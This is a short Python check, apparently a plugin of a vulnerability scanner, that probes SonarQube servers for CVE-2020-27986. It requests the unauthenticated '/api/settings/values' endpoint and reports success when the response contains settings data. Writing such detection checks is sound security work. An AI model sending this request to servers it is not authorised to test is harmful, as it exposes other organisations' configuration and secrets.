"""
CVE-2020-27986(SonarQube敏感信息泄露)
"""

import requests

from main import hprint, print_blue


def SonarQube_data_leak(url, timeout=6):
    print_blue('CVE-2020-27986')
    return_data = ''
    # if not url[0:1] == '/':
    #     url = url + '/'
    try:
        re = requests.get(url + '/api/settings/values', timeout=timeout)
        if 'setting' in re.text or 'key' in re.text:
            return "成功"
        else:
            return '失败'
    except ConnectionError as e:
        return '连接失败'
    except TimeoutError as e:
        return '连接超时'
    except Exception as e:
        return '未找到'

